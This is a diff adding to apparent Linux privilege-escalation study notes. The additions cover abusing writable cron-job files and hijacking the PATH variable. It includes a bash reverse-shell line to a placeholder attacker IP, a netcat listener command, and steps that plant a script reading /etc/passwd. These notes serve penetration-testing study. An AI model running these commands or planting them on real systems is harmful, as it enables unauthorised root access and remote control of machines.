@@ -68,3 +68,23 @@ Each user on the system have their crontab file and can run specific tasks wheth
 Any user can read the file keeping system-wide cron jobs under `/etc/crontab`
 
 If any file will run using the cron tab then you will see it starting with the ( ******* ) line 
+
+1. if you find any files in the cronjob table then you can modify that specific file where you add: 
+``` bash
+#!/bin/bash
+bash -i >& /dev/tcp/<ATTACK_MACHINE_IP>/<PORT> 0>&1
+```
+2. In attack  machine run the netcat listener
+` nc -lvnp <PORT>`
+3. Once your listener is ready, you just need to ping the target machine so that it will send the request once it is triggered.
+
+# Privilege Escalation: PATH
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
+
+1. Look for the `PATH` using `echo $PATH`
+2. Find any executable file
+3. Copy the sensitive file into the executable file using `echo "cat /etc/passwd" > <executable_file>`
+4. Give the execurable permison to the file using `chmod +x <exec_file>`
+5. Then export the file to the `$PATH` so that you are allowed to execute it `export PATH=/path/to/file_directory:$PATH`
+6. Run the <exec_file>
+
